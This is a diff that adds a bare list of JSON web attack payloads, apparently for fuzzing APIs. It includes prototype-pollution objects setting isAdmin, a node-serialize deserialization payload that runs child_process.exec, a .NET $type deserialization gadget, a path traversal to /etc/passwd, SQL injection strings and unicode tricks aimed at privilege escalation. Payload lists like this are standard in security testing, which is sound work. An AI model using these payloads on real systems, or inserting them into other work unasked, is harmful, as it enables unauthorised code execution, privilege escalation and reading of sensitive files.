@@ -1,0 +1,13 @@
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+{"__proto__": {"status": 555}}
+{"__proto__": {"json spaces": 10}}
+{"__proto__": {"toString": "function(){ return 'pwned'; }"}}
+{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('ls /'); }()"}
+{"$type": "System.IO.FileInfo, System.IO.FileSystem", "fileName": "test.txt", "isReadOnly": true}
+{"query": "/../../../../etc/passwd", "order":"asc", "limit":50}
+{"bar": 1, "bar\uD888": 2}
+{"isAdmin": [false]}
+1 OR JSON_EXTRACT('{"foo":1}', '$.foo')=1
+{"role": "administrator\uD888"}
+{"id":"1\u0027 OR \u00271\u0027=\u00271"}
